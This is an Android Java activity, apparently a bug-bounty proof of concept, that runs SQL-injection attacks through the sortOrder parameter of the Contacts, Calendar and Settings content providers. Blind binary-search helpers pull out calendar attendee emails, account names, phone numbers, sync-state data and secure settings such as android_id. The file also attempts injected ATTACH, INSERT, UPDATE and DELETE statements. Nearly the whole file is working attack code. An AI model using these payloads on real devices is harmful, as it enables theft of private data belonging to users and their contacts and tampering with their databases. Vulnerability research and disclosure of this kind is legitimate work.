package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SortOrderEscalateActivity extends Activity {
    private static final String TAG = "SortEscalate";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("SortOrder Escalation - ATTACH/WRITE/Cross-DB\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testAttachDatabase();
        testCalendarSensitiveData();
        testContactsSensitiveInternalTables();
        testSettingsSecureSensitiveKeys();
        testSortOrderWriteVectors();
        testCalendarSyncState();
        log("\n=== ALL ESCALATION TESTS COMPLETE ===");
    }

    private void testAttachDatabase() {
        log("=== TEST 1: ATTACH DATABASE via sortOrder ===\n");

        // Try to attach another database file via sortOrder injection
        String[] attachPayloads = {
            "CASE WHEN (SELECT count(*) FROM pragma_database_list)>1 THEN _id END",
            // Try to reference call_log database directly
            "CASE WHEN (SELECT count(*) FROM main.sqlite_master WHERE type='table' AND name='calls')>0 THEN _id END",
        };

        for (String p : attachPayloads) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.android.contacts/contacts"),
                    new String[]{"_id"}, null, null, p);
                if (c != null) {
                    log("[OK] " + shorten(p, 60) + " rows=" + c.getCount());
                    c.close();
                }
            } catch (Exception e) {
                log("[FAIL] " + shorten(e.getMessage(), 60));
            }
        }

        // Enumerate all databases attached to contacts provider
        int dbCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM pragma_database_list)");
        log("Attached DBs in Contacts: " + dbCount);
        for (int i = 0; i < dbCount; i++) {
            String name = blindExtract("content://com.android.contacts/contacts",
                "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET " + i + ")", 30);
            String file = blindExtract("content://com.android.contacts/contacts",
                "(SELECT file FROM pragma_database_list LIMIT 1 OFFSET " + i + ")", 100);
            log("  DB[" + i + "]: name=" + name + " file=" + file);
        }

        // Try ATTACH DATABASE statement in sortOrder — semi-colon injection
        String[] attackPayloads = {
            "_id; ATTACH DATABASE '/data/data/com.android.providers.contacts/databases/calllog.db' AS calllog; SELECT 1 FROM calllog.calls --",
            "_id; ATTACH '/data/user/0/com.android.providers.contacts/databases/calllog.db' AS cl --",
        };

        for (String p : attackPayloads) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.android.contacts/contacts"),
                    new String[]{"_id"}, null, null, p);
                if (c != null) {
                    log("[ATTACH-SEMI] Executed! rows=" + c.getCount());
                    c.close();
                }
            } catch (Exception e) {
                log("[ATTACH-SEMI] " + shorten(e.getMessage(), 80));
            }
        }
    }

    private void testCalendarSensitiveData() {
        log("\n=== TEST 2: Calendar Sensitive Data Extraction ===\n");

        // Extract from Attendees table — other people's emails
        int attendeeCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM Attendees)");
        log("Total attendees in calendar DB: " + attendeeCount);

        if (attendeeCount > 0) {
            int toExtract = Math.min(attendeeCount, 10);
            for (int i = 0; i < toExtract; i++) {
                String email = blindExtract("content://com.android.calendar/events",
                    "(SELECT attendeeEmail FROM Attendees LIMIT 1 OFFSET " + i + ")", 50);
                String name = blindExtract("content://com.android.calendar/events",
                    "(SELECT attendeeName FROM Attendees LIMIT 1 OFFSET " + i + ")", 30);
                int status = blindInt("content://com.android.calendar/events",
                    "(SELECT attendeeStatus FROM Attendees LIMIT 1 OFFSET " + i + ")");
                log("[ATTENDEE] " + email + " name=" + name + " status=" + status);
            }
        }

        // Extract CalendarAlerts — may contain event details and times
        int alertCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM CalendarAlerts)");
        log("Calendar alerts: " + alertCount);

        // ExtendedProperties — custom metadata
        int extPropCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM ExtendedProperties)");
        log("Extended properties: " + extPropCount);

        if (extPropCount > 0) {
            for (int i = 0; i < Math.min(extPropCount, 5); i++) {
                String propName = blindExtract("content://com.android.calendar/events",
                    "(SELECT name FROM ExtendedProperties LIMIT 1 OFFSET " + i + ")", 40);
                String propVal = blindExtract("content://com.android.calendar/events",
                    "(SELECT value FROM ExtendedProperties LIMIT 1 OFFSET " + i + ")", 60);
                log("[EXT-PROP] " + propName + "=" + propVal);
            }
        }

        // Calendars table — sync account info
        int calCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM Calendars)");
        log("Calendars: " + calCount);
        for (int i = 0; i < Math.min(calCount, 5); i++) {
            String acctName = blindExtract("content://com.android.calendar/events",
                "(SELECT account_name FROM Calendars LIMIT 1 OFFSET " + i + ")", 50);
            String acctType = blindExtract("content://com.android.calendar/events",
                "(SELECT account_type FROM Calendars LIMIT 1 OFFSET " + i + ")", 30);
            String calName = blindExtract("content://com.android.calendar/events",
                "(SELECT calendar_displayName FROM Calendars LIMIT 1 OFFSET " + i + ")", 40);
            log("[CALENDAR] " + calName + " acct=" + acctName + " type=" + acctType);
        }
    }

    private void testContactsSensitiveInternalTables() {
        log("\n=== TEST 3: Contacts Internal Sensitive Tables ===\n");

        // pre_authorized_uris — URIs that bypass permission checks
        int preAuthCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM pre_authorized_uris)");
        log("Pre-authorized URIs: " + preAuthCount);
        if (preAuthCount > 0) {
            for (int i = 0; i < Math.min(preAuthCount, 5); i++) {
                String uri = blindExtract("content://com.android.contacts/contacts",
                    "(SELECT uri FROM pre_authorized_uris LIMIT 1 OFFSET " + i + ")", 80);
                log("[PRE-AUTH] " + uri);
            }
        }

        // directories — contact directory (LDAP, Exchange, etc) configs
        int dirCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM directories)");
        log("Contact directories: " + dirCount);
        for (int i = 0; i < Math.min(dirCount, 5); i++) {
            String pkg = blindExtract("content://com.android.contacts/contacts",
                "(SELECT packageName FROM directories LIMIT 1 OFFSET " + i + ")", 50);
            String acct = blindExtract("content://com.android.contacts/contacts",
                "(SELECT accountName FROM directories LIMIT 1 OFFSET " + i + ")", 50);
            String auth = blindExtract("content://com.android.contacts/contacts",
                "(SELECT authority FROM directories LIMIT 1 OFFSET " + i + ")", 50);
            log("[DIR] pkg=" + pkg + " acct=" + acct + " auth=" + auth);
        }

        // settings — contacts settings per account
        int settingsCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM settings)");
        log("Contact settings: " + settingsCount);
        for (int i = 0; i < Math.min(settingsCount, 5); i++) {
            String acctName = blindExtract("content://com.android.contacts/contacts",
                "(SELECT account_name FROM settings LIMIT 1 OFFSET " + i + ")", 50);
            String acctType = blindExtract("content://com.android.contacts/contacts",
                "(SELECT account_type FROM settings LIMIT 1 OFFSET " + i + ")", 30);
            log("[SETTING] " + acctName + " type=" + acctType);
        }

        // agg_exceptions — contact aggregation exceptions (who got merged)
        int aggCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM agg_exceptions)");
        log("Aggregation exceptions: " + aggCount);

        // phone_lookup — reverse phone number lookup table
        int phoneLookupCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM phone_lookup)");
        log("Phone lookup entries: " + phoneLookupCount);
        if (phoneLookupCount > 0) {
            for (int i = 0; i < Math.min(phoneLookupCount, 5); i++) {
                String normalized = blindExtract("content://com.android.contacts/contacts",
                    "(SELECT normalized_number FROM phone_lookup LIMIT 1 OFFSET " + i + ")", 20);
                log("[PHONE-LOOKUP] " + normalized);
            }
        }
    }

    private void testSettingsSecureSensitiveKeys() {
        log("\n=== TEST 4: Settings.Secure Sensitive Key Extraction ===\n");

        // Enumerate ALL settings keys
        int secureCount = blindInt("content://settings/secure",
            "(SELECT count(*) FROM secure)");
        log("Total Settings.Secure entries: " + secureCount);

        // Extract specific sensitive keys
        String[] sensitiveKeys = {
            "android_id",
            "bluetooth_address",
            "bluetooth_name",
            "lock_screen_owner_info",
            "enabled_accessibility_services",
            "enabled_notification_listeners",
            "default_input_method",
            "enabled_input_methods",
            "backup_transport",
            "selected_spell_checker",
            "mock_location",
            "install_non_market_apps",
            "location_providers_allowed",
            "device_name",
            "user_setup_complete",
            "lockdown",
        };

        for (String key : sensitiveKeys) {
            String val = blindExtract("content://settings/secure",
                "(SELECT value FROM secure WHERE name='" + key + "')", 80);
            if (!val.equals("(empty)")) {
                log("[SETTING] " + key + " = " + val);
            }
        }

        // Also check Settings.Global
        log("\nSettings.Global sensitive keys:");
        String[] globalKeys = {
            "adb_enabled",
            "development_settings_enabled",
            "device_name",
            "wifi_on",
            "bluetooth_on",
            "mobile_data",
            "airplane_mode_on",
            "usb_mass_storage_enabled",
            "stay_on_while_plugged_in",
            "package_verifier_enable",
        };

        for (String key : globalKeys) {
            String val = blindExtract("content://settings/global",
                "(SELECT value FROM global WHERE name='" + key + "')", 50);
            if (!val.equals("(empty)")) {
                log("[GLOBAL] " + key + " = " + val);
            }
        }
    }

    private void testSortOrderWriteVectors() {
        log("\n=== TEST 5: sortOrder Write Escalation ===\n");

        // Test: Can we do INSERT via sortOrder using semicolon injection?
        String[] writePayloads = {
            "_id; INSERT INTO data(raw_contact_id,mimetype_id) VALUES(1,1) --",
            "_id; UPDATE contacts SET display_name='HACKED' WHERE _id=1 --",
            "_id; DELETE FROM data WHERE 0 --",
            "CASE WHEN (SELECT changes())>0 THEN _id END",
        };

        for (String p : writePayloads) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.android.contacts/contacts"),
                    new String[]{"_id"}, null, null, p);
                if (c != null) {
                    log("[WRITE-TEST] " + shorten(p, 50) + " rows=" + c.getCount());
                    c.close();
                }
            } catch (Exception e) {
                log("[WRITE-BLOCKED] " + shorten(p, 30) + ": " + shorten(e.getMessage(), 50));
            }
        }

        // Test: Can we use INSERT via Calendar sortOrder (we have WRITE_CALENDAR)?
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"_id"}, null, null,
                "_id; INSERT INTO Events(calendar_id,title,dtstart,dtend) VALUES(1,'INJECTED',0,0) --");
            if (c != null) {
                log("[CAL-WRITE] Semicolon exec: rows=" + c.getCount());
                c.close();
            }
        } catch (Exception e) {
            log("[CAL-WRITE] Semicolon: " + shorten(e.getMessage(), 60));
        }

        // Test: Can we use sortOrder to modify via triggers?
        // Check if triggers exist
        int triggerCount = blindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM sqlite_master WHERE type='trigger')");
        log("Triggers in contacts DB: " + triggerCount);

        int calTriggerCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM sqlite_master WHERE type='trigger')");
        log("Triggers in calendar DB: " + calTriggerCount);

        // Enumerate trigger names
        if (triggerCount > 0) {
            for (int i = 0; i < Math.min(triggerCount, 10); i++) {
                String name = blindExtract("content://com.android.contacts/contacts",
                    "(SELECT name FROM sqlite_master WHERE type='trigger' LIMIT 1 OFFSET " + i + ")", 50);
                log("[TRIGGER] contacts: " + name);
            }
        }
    }

    private void testCalendarSyncState() {
        log("\n=== TEST 6: Calendar _sync_state Extraction ===\n");

        // _sync_state contains sync tokens and auth data
        int syncCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM _sync_state)");
        log("Sync state entries: " + syncCount);

        if (syncCount > 0) {
            for (int i = 0; i < Math.min(syncCount, 5); i++) {
                String acctName = blindExtract("content://com.android.calendar/events",
                    "(SELECT account_name FROM _sync_state LIMIT 1 OFFSET " + i + ")", 50);
                String acctType = blindExtract("content://com.android.calendar/events",
                    "(SELECT account_type FROM _sync_state LIMIT 1 OFFSET " + i + ")", 30);
                int dataLen = blindInt("content://com.android.calendar/events",
                    "(SELECT length(data) FROM _sync_state LIMIT 1 OFFSET " + i + ")");
                log("[SYNC] acct=" + acctName + " type=" + acctType + " data_len=" + dataLen);

                // Try to extract the sync data (may be binary/protobuf)
                if (dataLen > 0 && dataLen < 200) {
                    String data = blindExtract("content://com.android.calendar/events",
                        "(SELECT hex(data) FROM _sync_state LIMIT 1 OFFSET " + i + ")", 100);
                    log("[SYNC-DATA] hex=" + data);
                }
            }
        }

        // Colors table
        int colorCount = blindInt("content://com.android.calendar/events",
            "(SELECT count(*) FROM Colors)");
        log("Calendar colors: " + colorCount);
    }

    private boolean blindBool(String uri, String condition) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(uri), new String[]{"_id"}, null, null,
                "CASE WHEN " + condition + " THEN _id ELSE _id END ASC");
            if (c != null) { c.close(); return true; }
        } catch (Exception e) { }
        return false;
    }

    private int blindInt(String uri, String subquery) {
        int lo = 0, hi = 100000;
        if (!blindBool(uri, subquery + ">0")) return 0;
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (blindBool(uri, subquery + ">=" + mid)) lo = mid;
            else hi = mid - 1;
            if (hi - lo <= 1) {
                if (blindBool(uri, subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String blindExtract(String uri, String subquery, int maxLen) {
        StringBuilder sb = new StringBuilder();
        int len = blindInt(uri, "(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);
        for (int pos = 1; pos <= len; pos++) {
            String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
            int lo = 32, hi = 126;
            while (lo < hi) {
                int mid = (lo + hi + 1) / 2;
                if (blindBool(uri, expr + ">=" + mid)) lo = mid;
                else hi = mid - 1;
            }
            if (blindBool(uri, expr + "=" + lo)) sb.append((char) lo);
            else sb.append('?');
        }
        return sb.toString();
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
